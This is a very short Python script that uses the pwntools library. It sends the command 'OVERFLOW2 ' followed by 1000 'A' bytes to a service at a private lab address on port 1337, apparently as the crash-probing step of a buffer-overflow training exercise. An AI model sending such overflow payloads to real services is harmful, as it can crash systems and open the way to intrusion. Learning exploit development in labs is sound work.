#!/usr/bin/env python3

from pwn import *

host = "10.10.107.134"
port = 1337

s = remote(host, port)

payload = [
    b"OVERFLOW2 ",
    b"A" * 1000,

]

payload = b"".join(payload)
s.send(payload)